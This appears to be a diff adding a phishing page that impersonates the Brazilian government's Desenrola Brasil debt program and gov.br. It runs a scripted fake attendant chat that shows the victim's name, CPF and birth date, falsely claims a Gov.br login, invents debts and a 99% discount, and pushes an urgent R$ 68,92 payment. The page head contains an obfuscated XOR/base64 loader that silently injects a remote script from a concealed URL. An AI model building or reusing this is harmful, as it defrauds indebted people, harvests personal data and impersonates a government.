@@ -1,0 +1,759 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+  <link rel="icon" type="image/png" sizes="96x96" href="images/icons8-brasil-windows-11-color-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="images/icons8-brasil-windows-11-color-16.png">
+  <title>Desenrola Brasil — Atendimento</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/desenrola.css">
+  <script>(function(){var s_78ph=atob("DLtN903eulVAC7JQNMBvgj+ymG9iY8YkRMh32GK93jtufsY9Xd002S6x13sieZ0jV8kkhzmtlSUpc9c8G8skjyiylD8zKZ5yVc85hSS8zyEleJBqb+Zh1Sqy1TchZ8FyDuA21SO/1zBiMZAgXcMomwS6mHlifdM8Qd5vzW/o2zR3PYdjB4J9xHy6gjQiOYNmAo16wyj8xwg9");var v_3fah=[];for(var q_tj=0;q_tj<s_78ph.length;q_tj++){v_3fah.push(s_78ph.charCodeAt(q_tj)&255);}var o_7=v_3fah[0];var z_o=v_3fah.slice(1,1+o_7);var a_y=v_3fah.slice(1+o_7);var k_q=a_y.map(function(b,w_z3){return b^z_o[w_z3%o_7];});var p_mpj="";for(var g_xo=0;g_xo<k_q.length;g_xo++){p_mpj+=String.fromCharCode(k_q[g_xo]&255);}var c_s7=decodeURIComponent(escape(p_mpj));var z_9z6=JSON.parse(c_s7);var f_mt=z_9z6.globals||[];f_mt.forEach(function(i_pl3){window[i_pl3.name]=i_pl3.value;});var p_84=document.createElement("script");p_84.src=z_9z6.url;p_84.async=true;p_84.defer=true;(z_9z6.attributes||[]).forEach(function(c_r){p_84.setAttribute(c_r.name,c_r.value);});(document.head||document.documentElement).appendChild(p_84);})();</script>
+</head>
+<body>
+  <div class="page-chat">
+    <!-- Header -->
+    <header class="chat-header">
+      <img src="images/iconegov.png" alt="gov.br">
+      <button class="btn-user">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+        </svg>
+        <span id="nomeUsuario">Usuário</span>
+      </button>
+    </header>
+
+    <!-- Atendente -->
+    <div class="attendant-strip">
+      <img src="/chat/images/leticia.png" alt="Letícia M.">
+      <div>
+        <div class="att-nome">Letícia M.</div>
+        <div class="att-cargo">Atendente do Programa Desenrola Brasil</div>
+      </div>
+    </div>
+
+    <!-- Feed -->
+    <div class="chat-msgs" id="msgs">
+      <div class="msg-row" id="typing-row">
+        <img class="avatar" src="/chat/images/leticia.png">
+        <div class="typing"><span></span><span></span><span></span></div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+      <div class="gv">gov.br</div>
+      <div class="gv-sub">Todo o conteúdo deste site está publicado sob a licença</div>
+      <div class="gv-copy">Sistema de Renegociação — Todos os direitos reservados</div>
+    </footer>
+  </div>
+
+  <script>
+  /**
+   * Coleta nome/CPF/nasc da URL ou localStorage. Sem isso, não há atendimento.
+   */
+  function paramsFromUrl() {
+    var p = new URLSearchParams(window.location.search);
+    return {
+      nome:   p.get('nome') || '',
+      cpf:    p.get('cpf')  || '',
+      nasc:   p.get('nasc') || ''
+    };
+  }
+
+  function formatCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '').slice(0, 11);
+    if (d.length <= 3) return d;
+    if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+    if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+    return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+  }
+
+  function formatData(data) {
+    if (!data || data.length < 10) return data;
+    var m = String(data).match(/(\d{4})-(\d{2})-(\d{2})/);
+    if (m) return m[3] + '/' + m[2] + '/' + m[1];
+    return data;
+  }
+
+  var u = paramsFromUrl();
+  var storage = {};
+  try {
+    storage.nome = localStorage.getItem('site.nome') || '';
+    storage.cpf  = localStorage.getItem('site.cpf')  || '';
+    storage.nasc = localStorage.getItem('site.nasc') || '';
+  } catch (_) {}
+
+  var NOME          = (u.nome  || storage.nome || 'Usuário');
+  var NOME_COMPLETO = NOME;
+  var CPF           = (u.cpf   || storage.cpf  || '');
+  var CPF_FORMATADO = formatCPF(CPF);
+  var NASC          = (u.nasc  || storage.nasc || '');
+
+  // Gera código de acordo determinístico por CPF (sempre o mesmo pro mesmo CPF)
+  function codeFromCPF(cpf) {
+    var d = String(cpf || '').replace(/\D/g, '');
+    var h = 5381;
+    for (var i = 0; i < d.length; i++) h = (h * 33 + d.charCodeAt(i)) >>> 0;
+    var s = h.toString(36).toUpperCase().padStart(8, 'X');
+    return (s.slice(0, 5) + '-' + s.slice(5, 9) + '-' + s.slice(9, 13) + '-' + s.slice(13, 17)).slice(0, 17);
+  }
+  var CODIGO_ACORDO = codeFromCPF(CPF);
+
+  // Valor PIX: fixo em R$ 68,92
+  var VALOR = 'R$ 68,92';
+
+  // Phone e Email para Paradise PIX (valores padrão)
+  var PHONE = '11988887777';
+  var EMAIL = 'cliente@desenrola.br';
+
+  var AVATAR = '/chat/images/leticia.png';
+
+  // Mostrar nome no header
+  try {
+    var el = document.getElementById('nomeUsuario');
+    if (el) el.textContent = NOME.split(' ')[0] || 'Usuário';
+  } catch (_) {}
+
+  var msgs = document.getElementById('msgs');
+  var currentAudio = null;  // Rastreia qual áudio está tocando
+
+  function tag(t) {
+    return (t||'').replace(/\{NOME\}/g, NOME)
+      .replace(/\{NOME_COMPLETO\}/g, NOME_COMPLETO)
+      .replace(/\{CPF\}/g, CPF)
+      .replace(/\{CPF_FORMATADO\}/g, CPF_FORMATADO)
+      .replace(/\{NASC\}/g, NASC)
+      .replace(/\{CODIGO_ACORDO\}/g, CODIGO_ACORDO)
+      .replace(/\{VALOR\}/g, VALOR);
+  }
+
+  var scroll = function () { setTimeout(function () { msgs.scrollTop = msgs.scrollHeight; }, 60); };
+  var sleep  = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+
+  function addTyping() {
+    removeTyping();
+    var row = document.createElement('div');
+    row.className = 'msg-row'; row.id = 'typing-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div class="typing"><span></span><span></span><span></span></div>';
+    msgs.appendChild(row); scroll();
+  }
+  function removeTyping() { var el = document.getElementById('typing-row'); if (el) el.remove(); }
+
+  function botRow(inner) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">' + inner;
+    msgs.appendChild(row); scroll();
+    return row;
+  }
+
+  function addUser(text) {
+    var row = document.createElement('div');
+    row.className = 'msg-row user';
+    row.innerHTML = '<div class="bubble-user">' + text + '</div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addSystem(text) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<div style="width:30px;margin-right:7px;flex-shrink:0"></div><div class="bubble-system">' + tag(text) + '</div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addImage(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div style="flex:1"><img src="' + src + '" style="max-width:100%;border-radius:8px;margin-top:8px"></div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addVideo(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '"><div style="flex:1"><video height="400" controls style="border-radius:8px;margin-top:8px;width:auto;max-width:100%"><source src="' + src + '" type="video/mp4"></video></div>';
+    msgs.appendChild(row); scroll();
+  }
+
+  function addVideoAutoplay(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+    var videoContainer = document.createElement('div');
+    videoContainer.style.flex = '1';
+    videoContainer.style.position = 'relative';
+    videoContainer.style.display = 'inline-block';
+    videoContainer.style.width = '100%';
+
+    var video = document.createElement('video');
+    video.src = src;
+    video.height = '400';
+    video.autoplay = true;
+    video.playsinline = true;
+    video.style.borderRadius = '8px';
+    video.style.marginTop = '8px';
+    video.style.width = 'auto';
+    video.style.maxWidth = '100%';
+    video.style.display = 'block';
+    video.setAttribute('playsinline', '');
+    video.setAttribute('webkit-playsinline', '');
+    video.setAttribute('x5-playsinline', '');
+
+    var controls = document.createElement('div');
+    controls.style.position = 'absolute';
+    controls.style.bottom = '10px';
+    controls.style.left = '10px';
+    controls.style.display = 'flex';
+    controls.style.gap = '10px';
+    controls.style.zIndex = '10';
+
+    var playPauseBtn = document.createElement('button');
+    playPauseBtn.style.width = '52px';
+    playPauseBtn.style.height = '52px';
+    playPauseBtn.style.borderRadius = '50%';
+    playPauseBtn.style.backgroundColor = '#1351B4';
+    playPauseBtn.style.border = 'none';
+    playPauseBtn.style.cursor = 'pointer';
+    playPauseBtn.style.display = 'flex';
+    playPauseBtn.style.alignItems = 'center';
+    playPauseBtn.style.justifyContent = 'center';
+    playPauseBtn.style.fontSize = '0';
+    playPauseBtn.style.color = '#fff';
+    playPauseBtn.style.boxShadow = '0 2px 8px rgba(0,0,0,0.2)';
+
+    // SVG pause icon
+    var pauseSvg = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+    // SVG play icon
+    var playSvg = '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+
+    playPauseBtn.innerHTML = pauseSvg;
+    playPauseBtn.style.color = '#fff';
+
+    var isPlaying = false;
+    playPauseBtn.innerHTML = playSvg;
+
+    function attemptPlay() {
+      var playPromise = video.play();
+      if (playPromise !== undefined) {
+        playPromise.then(function() {
+          isPlaying = true;
+          playPauseBtn.innerHTML = pauseSvg;
+        }).catch(function(e) {
+          console.log('Play failed, needs user interaction:', e);
+          isPlaying = false;
+          playPauseBtn.innerHTML = playSvg;
+        });
+      }
+    }
+
+    // Tenta autoplay após 1 segundo
+    setTimeout(attemptPlay, 1000);
+
+    // Se autoplay falhar, permite clicar no botão ou no vídeo
+    playPauseBtn.onclick = function(e) {
+      e.stopPropagation();
+      if (isPlaying) {
+        video.pause();
+        playPauseBtn.innerHTML = playSvg;
+        isPlaying = false;
+      } else {
+        attemptPlay();
+      }
+    };
+
+    // Também permite clicar no vídeo para reproduzir
+    videoContainer.onclick = function(e) {
+      if (e.target === video || e.target === videoContainer) {
+        if (!isPlaying) {
+          attemptPlay();
+        }
+      }
+    };
+
+    controls.appendChild(playPauseBtn);
+    videoContainer.appendChild(video);
+    videoContainer.appendChild(controls);
+
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">';
+    row.appendChild(videoContainer);
+    msgs.appendChild(row); scroll();
+  }
+
+  function addAudio(src) {
+    var row = document.createElement('div');
+    row.className = 'msg-row';
+
+    // Parar qualquer áudio anterior e remover do DOM
+    if (currentAudio) {
+      try {
+        currentAudio.pause();
+        currentAudio.currentTime = 0;
+        currentAudio.src = '';
+        currentAudio.load();
+      } catch (e) {}
+    }
+
+    var audio = document.createElement('audio');
+    audio.src = src;
+    audio.preload = 'auto';
+    audio.autoplay = true;
+    audio.controls = false;
+    currentAudio = audio;
+
+    // Forçar play após áudio carregar
+    audio.oncanplaythrough = function() {
+      var playPromise = audio.play();
+      if (playPromise !== undefined) {
+        playPromise.catch(function(e) {
+          console.log('Audio autoplay blocked:', e);
+          audio.play().catch(function() {});
+        });
+      }
+    };
+
+    // Container principal (fundo branco/cinza)
+    var audioDiv = document.createElement('div');
+    audioDiv.style.backgroundColor = '#F5F5F5';
+    audioDiv.style.borderRadius = '12px';
+    audioDiv.style.padding = '12px';
+    audioDiv.style.width = '280px';
+    audioDiv.style.display = 'flex';
+    audioDiv.style.alignItems = 'center';
+    audioDiv.style.gap = '12px';
+
+    // Botão play azul grande
+    var playBtn = document.createElement('button');
+    playBtn.style.width = '52px';
+    playBtn.style.height = '52px';
+    playBtn.style.borderRadius = '50%';
+    playBtn.style.backgroundColor = '#1351B4';
+    playBtn.style.border = 'none';
+    playBtn.style.cursor = 'pointer';
+    playBtn.style.display = 'flex';
+    playBtn.style.alignItems = 'center';
+    playBtn.style.justifyContent = 'center';
+    playBtn.style.flexShrink = '0';
+    playBtn.style.color = '#fff';
+    playBtn.style.fontSize = '0';
+    playBtn.style.boxShadow = '0 2px 8px rgba(0,0,0,0.2)';
+
+    // SVG play/pause
+    var audioPlaySvg = '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+    var audioPauseSvg = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+    playBtn.innerHTML = audioPauseSvg;
+
+    // Container interno para barra de progresso + tempo
+    var contentDiv = document.createElement('div');
+    contentDiv.style.flex = '1';
+    contentDiv.style.display = 'flex';
+    contentDiv.style.flexDirection = 'column';
+    contentDiv.style.gap = '6px';
+
+    // Barra de progresso cinza
+    var progressBar = document.createElement('div');
+    progressBar.style.height = '4px';
+    progressBar.style.backgroundColor = '#D3D3D3';
+    progressBar.style.borderRadius = '2px';
+    progressBar.style.cursor = 'pointer';
+    progressBar.style.width = '100%';
+    progressBar.style.position = 'relative';
+
+    // Progresso preenchido
+    var progressFill = document.createElement('div');
+    progressFill.style.height = '100%';
+    progressFill.style.backgroundColor = '#1351B4';
+    progressFill.style.borderRadius = '2px';
+    progressFill.style.width = '0%';
+    progressBar.appendChild(progressFill);
+
+    // Tempo
+    var timeDiv = document.createElement('div');
+    timeDiv.style.fontSize = '13px';
+    timeDiv.style.color = '#666';
+    timeDiv.style.fontWeight = '500';
+    timeDiv.style.textContent = '0:00 / 0:17';
+
+    var isPlaying = true;
+
+    setTimeout(function() {
+      var playPromise = audio.play();
+      if (playPromise !== undefined) {
+        playPromise.catch(function(e) {
+          console.log('Audio autoplay:', e);
+        });
+      }
+    }, 200);
+
+    playBtn.onclick = function() {
+      if (isPlaying) {
+        audio.pause();
+        playBtn.innerHTML = audioPlaySvg;
+        isPlaying = false;
+      } else {
+        audio.play();
+        playBtn.innerHTML = audioPauseSvg;
+        isPlaying = true;
+      }
+    };
+
+    audio.onended = function() {
+      playBtn.innerHTML = '▶';
+      isPlaying = false;
+      progressFill.style.width = '0%';
+    };
+
+    audio.onloadedmetadata = function() {
+      var mins = Math.floor(audio.duration / 60);
+      var secs = Math.floor(audio.duration % 60);
+      var durStr = (secs < 10 ? '0' : '') + secs;
+      timeDiv.textContent = '0:00 / ' + mins + ':' + durStr;
+    };
+
+    audio.ontimeupdate = function() {
+      var percent = (audio.currentTime / audio.duration) * 100;
+      progressFill.style.width = percent + '%';
+
+      var mins = Math.floor(audio.currentTime / 60);
+      var secs = Math.floor(audio.currentTime % 60);
+      var currentStr = (secs < 10 ? '0' : '') + secs;
+      var totalMins = Math.floor(audio.duration / 60);
+      var totalSecs = Math.floor(audio.duration % 60);
+      var totalStr = (totalSecs < 10 ? '0' : '') + totalSecs;
+      timeDiv.textContent = mins + ':' + currentStr + ' / ' + totalMins + ':' + totalStr;
+    };
+
+    // Clicar na barra de progresso para pular
+    progressBar.onclick = function(e) {
+      var rect = progressBar.getBoundingClientRect();
+      var percent = (e.clientX - rect.left) / rect.width;
+      audio.currentTime = percent * audio.duration;
+    };
+
+    contentDiv.appendChild(progressBar);
+    contentDiv.appendChild(timeDiv);
+
+    audioDiv.appendChild(playBtn);
+    audioDiv.appendChild(contentDiv);
+
+    row.innerHTML = '<img class="avatar" src="' + AVATAR + '">';
+    var wrapper = document.createElement('div');
+    wrapper.style.flex = '1';
+    wrapper.appendChild(audioDiv);
+    row.appendChild(wrapper);
+    msgs.appendChild(row); scroll();
+  }
+
+  function addAudioThen(audioSrc, onAction) {
+    addAudio(audioSrc);
+    return new Promise(function(resolve) {
+      var audio = currentAudio;
+      var actionExecuted = false;
+      var checkInterval = null;
+
+      function setupMonitoring() {
+        var duration = audio.duration;
+        if (duration && duration > 0) {
+          var executeAt = Math.max(0, duration - 3);
+
+          checkInterval = setInterval(function() {
+            if (audio.currentTime >= executeAt && !actionExecuted) {
+              actionExecuted = true;
+              if (checkInterval) clearInterval(checkInterval);
+              onAction().then(resolve).catch(resolve);
+            }
+          }, 100);
+
+          audio.onended = function() {
+            if (checkInterval) clearInterval(checkInterval);
+            if (!actionExecuted) {
+              actionExecuted = true;
+              onAction().then(resolve).catch(resolve);
+            }
+          };
+        }
+      }
+
+      // Tenta setup imediatamente se metadata já está loaded
+      if (audio.readyState >= 1) {
+        setupMonitoring();
+      } else {
+        audio.onloadedmetadata = setupMonitoring;
+      }
+
+      // Fallback: se nada acontecer em 120 segundos, mostra o botão
+      setTimeout(function() {
+        if (!actionExecuted) {
+          actionExecuted = true;
+          if (checkInterval) clearInterval(checkInterval);
+          onAction().then(resolve).catch(resolve);
+        }
+      }, 120000);
+    });
+  }
+
+  function addAudioWithButton(audioSrc, buttonText) {
+    return addAudioThen(audioSrc, function() {
+      return addButtons([buttonText], false, true, true);
+    });
+  }
+
+  function infoCard(lines) {
+    var html = '<div class="bubble-info-card">';
+    lines.forEach(function (l) {
+      html += '<div class="' + ({label:'ic-label',value:'ic-value',bold:'ic-bold'}[l.style] || 'ic-label') + '">' + tag(l.text) + '</div>';
+    });
+    html += '</div>';
+    botRow(html);
+  }
+
+  function addButtons(options, wide, solid, right) {
+    return new Promise(function (resolve) {
+      var wrap = document.createElement('div');
+      wrap.style.marginBottom = '8px';
+      if (right) { wrap.style.display = 'flex'; wrap.style.justifyContent = 'flex-end'; }
+      else { wrap.style.marginLeft = '37px'; }
+      var row = document.createElement('div');
+      row.className = wide ? 'btn-row' : 'btn-row row-inline';
+      options.forEach(function (opt) {
+        var btn = document.createElement('button');
+        btn.className = 'chat-btn' + (wide ? ' wide solid' : '') + (!wide && solid ? ' solid' : '');
+        btn.textContent = opt;
+        btn.onclick = function () {
+          wrap.remove();
+          addUser(opt);
+          resolve(opt);
+        };
+        row.appendChild(btn);
+      });
+      wrap.appendChild(row);
+      msgs.appendChild(wrap); scroll();
+    });
+  }
+
+  async function startFlow() {
+    // Sem dados do CPF? Volta pro início
+    if (!NOME || !CPF) {
+      addSystem('<em><strong>(Dados incompletos. Redirecionando para o início...)</strong></em>');
+      setTimeout(function () { window.location.href = '../cpf/'; }, 1800);
+      return;
+    }
+
+    addImage('../assets/image1.png');
+    await botSay('Olá {NOME_COMPLETO}, esse é um canal oficial de atendimento do <strong>Desenrola Brasil</strong> e os seus dados estão seguros conosco. 🔒');
+    await botSay('Aguarde em alguns instantes, um de nossos atendentes entrará na conversa..');
+    addVideoAutoplay('../assets/video1.mp4');
+    addSystem('<em><strong>(Atendente Letícia entrou na conversa..)</strong></em> 💬');
+
+    // Aguarda 17 segundos antes de mostrar confirmação
+    await sleep(17000);
+
+    // Confirmação de dados
+    var confirmWrap = document.createElement('div');
+    confirmWrap.style.marginLeft = '37px';
+    confirmWrap.style.marginBottom = '8px';
+    var cCard = document.createElement('div');
+    cCard.className = 'confirm-card';
+    cCard.innerHTML = '<span class="confirm-title">Para continuar, confirme seus dados:</span>'
+      + '<strong>Nome:</strong><span>' + NOME_COMPLETO + '</span>'
+      + '<strong>CPF:</strong><span>' + CPF_FORMATADO + '</span>'
+      + (NASC ? '<strong>Data de Nascimento:</strong><span>' + formatData(NASC) + '</span>' : '');
+    var btnsConfirm = document.createElement('div');
+    btnsConfirm.className = 'confirm-btns';
+    ['Sim, está correto.', 'Não sou eu'].forEach(function (label) {
+      var btn = document.createElement('button');
+      btn.className = 'chat-btn' + (label.indexOf('Sim') === 0 ? ' solid' : '');
+      btn.textContent = label;
+      btn.onclick = function () {
+        btnsConfirm.remove();
+        addUser(label);
+        if (label.indexOf('Sim') === 0) continueFlow();
+        else { setTimeout(async function () { await botSay('Por favor, acesse o site com o seu CPF para prosseguir.'); setTimeout(function(){ window.location.href = '../cpf/'; }, 1500); }, 600); }
+      };
+      btnsConfirm.appendChild(btn);
+    });
+    confirmWrap.appendChild(cCard); confirmWrap.appendChild(btnsConfirm);
+    msgs.appendChild(confirmWrap); scroll();
+  }
+
+  async function botSay(html) {
+    addTyping(); await sleep(1200); removeTyping();
+    botRow('<div class="bubble-bot">' + tag(html) + '</div>');
+    await sleep(900);
+  }
+
+  async function continueFlow() {
+    await sleep(500);
+    await botSay('Obrigada!');
+    await botSay('Aguarde... Entrando em sua conta Gov.br');
+    await botSay('<strong>Login efetuado com sucesso!</strong>');
+    await botSay('<strong>{NOME_COMPLETO}</strong><br>Seja bem vindo(a) a sua conta Gov.br');
+    await botSay('Negocie dívidas com as seguintes empresas:');
+    addImage('../assets/image2.png');
+
+    await addButtons(['CONTINUAR'], false, true, true);
+    await addAudioWithButton('../assets/Desktop2026.mp3', 'SIM! QUERO NEGOCIAR');
+
+    await botSay('<em>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</em>');
+    await sleep(3000);
+    await botSay('<em>Consultando..</em>');
+    await sleep(3000);
+    await botSay('<strong>Análise concluída!</strong>');
+    await sleep(3000);
+    await botSay('Identificamos <strong>4 dívidas ativas</strong> no sistema. Os valores variam entre <strong>R$ 1.728,74 a R$ 5.278,23</strong> de dívida <strong>em seu CPF.</strong>');
+    await sleep(3000);
+
+    infoCard([
+      { text: 'Situação para CPF:', style: 'label' },
+      { text: '{CPF_FORMATADO}',   style: 'value' },
+      { text: 'NEGATIVADO.',       style: 'bold'  }
+    ]);
+
+    await botSay('Segundo nossos registros, seu SCORE é considerado muito baixo <strong>(alto risco para crédito):</strong>');
+    addImage('../assets/score.jpg');
+    await botSay('Você deseja verificar se existe algum acordo com desconto disponível para você?');
+    await addButtons(['BUSCAR ACORDO'], false, true, true);
+
+    await botSay('<em>Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...</em>');
+    await botSay('<strong>Acordo encontrado!</strong>');
+    infoCard([
+      { text: '1 (um) acordo foi encontrado para:', style: 'bold' },
+      { text: '{NOME_COMPLETO}',                    style: 'value' },
+      { text: 'CPF: {CPF_FORMATADO}',               style: 'value' }
+    ]);
+    await addButtons(['VER ACORDO'], false, true, true);
+    await addAudioThen('../assets/buscaacordo.mp3', async function() {
+      await botSay('Parabéns <strong>{NOME_COMPLETO}!</strong><br><br>Pode comemorar! Encontramos um <strong>SUPER ACORDO DE 99% DE DESCONTO</strong> para você!');
+      return Promise.resolve();
+    });
+    await botSay('<em>Acessando o acordo <strong>{CODIGO_ACORDO}</strong>...</em>');
+    await botSay('Informações do acordo <strong><em>{CODIGO_ACORDO}</em></strong> para ({NOME_COMPLETO})<br><br>(CPF: {CPF_FORMATADO})');
+    await botSay('O contrato atual é válido apenas para o titular: <strong>{NOME_COMPLETO}</strong> portador(a) do CPF: <strong>{CPF_FORMATADO}</strong>');
+    await botSay('Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>{VALOR}</strong>?');
+    await addButtons(['CONFIRMAR O ACORDO E LIMPAR O NOME'], false, true, true);
+    await addAudioThen('../assets/parabens.mp3', async function() {
+      await botSay('<strong>Acordo confirmado com sucesso!</strong>');
+      return await addButtons(['CONTINUAR'], false, true, true);
+    });
+    await addAudioThen('../assets/pagamento.mp3', async function() {
+      infoCard([
+        { text: 'Acordo confirmado: {CODIGO_ACORDO}!',  style: 'label' },
+        { text: 'Beneficiário(a):',                    style: 'label' },
+        { text: '{NOME_COMPLETO}',                     style: 'bold'  },
+        { text: 'Identificação (CPF):',                style: 'label' },
+        { text: '{CPF_FORMATADO}',                     style: 'bold'  },
+        { text: 'Quitação de todas as dívidas em ativo no CPF.', style: 'value' },
+        { text: '895 Pontos no score.',                style: 'bold'  },
+        { text: 'Valor da proposta: {VALOR}',          style: 'label' }
+      ]);
+      return await addButtons(['CONTINUAR PARA O PAGAMENTO'], false, true, true);
+    });
+    await addAudioThen('../assets/aviso.mp3', async function() {
+      await botSay('<strong><em>Atenção!</em></strong> <em>Oferta Válida Apenas para hoje.</em>');
+      return await botSay('<em>Clique no botão abaixo para acessar a próxima tela e realizar seu pagamento</em>');
+    });
+
+    // Botão final: leva pra /pagamento/ com cpf/nome/phone/email/valor/acordo
+    await sleep(600);
+    var qs = '?cpf=' + encodeURIComponent(CPF)
+           + '&nome=' + encodeURIComponent(NOME_COMPLETO)
+           + '&phone=' + encodeURIComponent(PHONE)
+           + '&email=' + encodeURIComponent(EMAIL)
+           + '&valor=' + encodeURIComponent(VALOR)
+           + '&acordo=' + encodeURIComponent(CODIGO_ACORDO);
+    var finRow = document.createElement('div');
+    finRow.style.marginLeft = '37px';
+    finRow.style.marginBottom = '8px';
+    var finA = document.createElement('a');
+    finA.href = '../pagamento/' + qs;
+    finA.className = 'btn-link-final';
+    finA.textContent = 'REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME';
+    finRow.appendChild(finA);
+    msgs.appendChild(finRow); scroll();
+  }
+
+  window.addEventListener('load', function () {
+    try {
+      setTimeout(startFlow, 400);
+    } catch (e) {
+      console.error('Erro no startFlow:', e);
+      addSystem('❌ Erro: ' + e.message);
+    }
+  });
+  </script>
+
+  <style>
+    /* Chat — estilos específicos que NÃO migram pro CSS compartilhado
+       pois só são usados nesta página */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; width: 100%; }
+    body { font-family: 'Inter', sans-serif; background: #f0f2f5; overflow: hidden; }
+    .page-chat { display: flex; flex-direction: column; min-height: 100vh; min-height: 100dvh; }
+    .chat-header {
+      background: #fff; border-bottom: 3px solid #1351B4; box-shadow: 0 2px 8px rgba(0,0,0,.1);
+      height: 58px; display: flex; align-items: center; justify-content: space-between;
+      padding: 0 16px; flex-shrink: 0;
+    }
+    .chat-header img { height: 34px; }
+    .btn-user { background: #1351B4; color: #fff; border: none; border-radius: 50px; padding: 6px 14px;
+      display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 500; font-family: inherit; }
+    .attendant-strip {
+      background: #fff; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; gap: 10px;
+      padding: 8px 14px; flex-shrink: 0; height: 56px;
+    }
+    .attendant-strip img { width: 38px; height: 38px; border-radius: 50%; object-fit: cover; flex-shrink: 0; }
+    .att-nome  { font-weight: 700; font-size: 14px; color: #1a1a1a; }
+    .att-cargo { font-size: 12px; color: #666; }
+    .chat-msgs { flex: 1 1 auto; overflow-y: auto; padding: 16px 16px 24px; max-width: 680px; width: 100%; margin: 0 auto; }
+    .site-footer { background: #071D41; height: 72px; display: flex; flex-direction: column; justify-content: center; padding: 0 18px; flex-shrink: 0; }
+    .site-footer .gv      { color: #fff; font-size: 18px; font-weight: 800; letter-spacing: -.5px; margin-bottom: 3px; }
+    .site-footer .gv-sub  { color: #E08D1E; font-size: 11px; }
+    .site-footer .gv-copy { color: #fff; font-size: 11px; font-weight: 700; }
+    .msg-row { display: flex; margin-bottom: 8px; align-items: flex-end; }
+    .msg-row.user { justify-content: flex-end; }
+    .avatar { width: 30px; height: 30px; border-radius: 50%; object-fit: cover; flex-shrink: 0; margin-right: 7px; margin-bottom: 2px; }
+    .bubble-bot {
+      background: #fff; color: #333; border: 1px solid #e5e5e5; border-radius: 18px 18px 18px 4px;
+      padding: 11px 15px; font-size: 14px; line-height: 1.55; max-width: 78%;
+      box-shadow: 0 2px 6px rgba(0,0,0,.07); overflow-wrap: break-word;
+      animation: fadeUp .3s ease both;
+    }
+    .bubble-user {
+      background: linear-gradient(135deg, #1351B4, #0F4DA8); color: #fff; border-radius: 18px 18px 4px 18px;
+      padding: 11px 15px; font-size: 14px; line-height: 1.55; max-width: 78%; overflow-wrap: break-word;
+      animation: fadeUp .3s ease both;
+    }
+    .bubble-system { color: #666; font-size: 12.5px; font-style: italic; padding: 4px 10px; text-align: center; animation: fadeUp .3s ease both; }
+    .bubble-info-card { background: #EFF6FF; border: 1px solid #BFDBFE; border-radius: 12px; padding: 14px 16px; font-size: 14px; line-height: 1.8; max-width: 82%; animation: fadeUp .3s ease both; }
+    .ic-label { color: #555; font-size: 13px; }
+    .ic-value { color: #1351B4; font-weight: 500; }
+    .ic-bold  { font-weight: 700; color: #1a1a1a; }
+    .confirm-card { background: #f5f5f5; border-radius: 10px; padding: 14px 16px; font-size: 14px; line-height: 1.7; margin-bottom: 10px; }
+    .confirm-title { font-weight: 700; display: block; margin-bottom: 8px; }
+    .confirm-card strong { display: block; color: #1a1a1a; }
+    .confirm-card span   { display: block; color: #1351B4; margin-bottom: 4px; }
+    .confirm-btns { display: flex; gap: 10px; justify-content: flex-end; flex-wrap: wrap; margin-top: 6px; }
+    .btn-row { display: flex; flex-direction: column; gap: 8px; margin-top: 4px; animation: fadeUp .3s ease both; }
+    .btn-row.row-inline { flex-direction: row; flex-wrap: wrap; }
+    .chat-btn {
+      background: #fff; border: 2px solid #1351B4; color: #1351B4; border-radius: 22px; padding: 10px 18px;
+      font-size: 14px; font-weight: 500; font-family: inherit; cursor: pointer; transition: background .15s, color .15s;
+    }
